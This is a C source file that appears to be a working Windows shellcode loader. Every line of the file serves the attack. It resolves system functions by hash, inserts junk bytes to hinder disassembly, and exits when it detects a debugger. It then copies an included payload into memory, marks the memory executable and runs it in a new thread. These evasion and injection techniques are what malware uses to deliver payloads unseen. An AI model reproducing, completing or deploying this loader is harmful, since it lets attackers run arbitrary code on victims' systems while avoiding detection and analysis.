#include "ldr.h"
#include "payload.c" // shellcode is meant to be an unsigned char array

#define TRUE  1
#define FALSE 0

static inline __attribute__((always_inline))
BOOL checkdbg(void)
{
    return ldr_get_peb()->BeingDebugged != 0;
}

#define JUNK_BYTES \
    __asm__ volatile( \
        "jmp 1f\n" \
        ".byte 0xE8, 0x88, 0x77, 0x66, 0x55\n" \
        "1:\n" \
    );

#define NOPSLED \
    __asm__ volatile( \
        "nop\n" "nop\n" "nop\n" "nop\n" \
        "nop\n" "nop\n" "nop\n" "nop\n" \
    );

__attribute__((section(".text")))
void loader_main(void)
{
    JUNK_BYTES

    FN_CloseHandle           CloseH   = (FN_CloseHandle)           ldr_get_by_hash(HASH_CLOSEHANDLE,            0);
    FN_CreateThread          CThread  = (FN_CreateThread)          ldr_get_by_hash(HASH_CREATETHREAD,           0);
    FN_ExitProcess           ExitP    = (FN_ExitProcess)           ldr_get_by_hash(HASH_EXITPROCESS,            0);
    FN_FlushInstructionCache FlushIC  = (FN_FlushInstructionCache) ldr_get_by_hash(HASH_FLUSHINSTRUCTIONCACHE,  0);
    FN_GetExitCodeThread     GetEC    = (FN_GetExitCodeThread)     ldr_get_by_hash(HASH_GETEXITCODETHREAD,      0);
    FN_IsDebuggerPresent     IsDbg    = (FN_IsDebuggerPresent)     ldr_get_by_hash(HASH_ISDEBUGGERPRESENT,      0);
    FN_RtlMoveMemory         RtlMM    = (FN_RtlMoveMemory)         ldr_get_by_hash(HASH_RTLMOVEMEMORY,          0);
    FN_VirtualAlloc          VAlloc   = (FN_VirtualAlloc)          ldr_get_by_hash(HASH_VIRTUALALLOC,           0);
    FN_VirtualFree           VFree    = (FN_VirtualFree)           ldr_get_by_hash(HASH_VIRTUALFREE,            0);
    FN_VirtualProtect        VProt    = (FN_VirtualProtect)        ldr_get_by_hash(HASH_VIRTUALPROTECT,         0);
    FN_WaitForSingleObject   WaitObj  = (FN_WaitForSingleObject)   ldr_get_by_hash(HASH_WAITFORSINGLEOBJECT,    0);

    if (!VAlloc || !VProt || !RtlMM || !CThread || !WaitObj || !CloseH || !IsDbg || !GetEC || !ExitP)
        return;

    if (checkdbg() || IsDbg())
        return;

    SIZE_T sclen = sizeof(shellcode);
    BYTE* mem = (BYTE*)VAlloc(0, sclen, MEM_COMMIT_RESERVE, PAGE_READWRITE);
    if (!mem)
        return;

    RtlMM(mem, shellcode, sclen);

    if (FlushIC)
        FlushIC((HANDLE)-1, mem, sclen);

    DWORD oldprot = 0;
    VProt(mem, sclen, PAGE_EXEC_READ, &oldprot);

    NOPSLED

    HANDLE hThread = CThread(0, 0, (LPTHREAD_START_ROUTINE)mem, 0, 0, 0);
    if (!hThread) {
        if (VFree)
            VFree(mem, 0, MEM_RELEASE);
        return;
    }

    WaitObj(hThread, INFINITE);

    DWORD exit_code = 0;
    GetEC(hThread, &exit_code);
    CloseH(hThread);

    if (VFree)
        VFree(mem, 0, MEM_RELEASE);

    ExitP((UINT)exit_code);
}
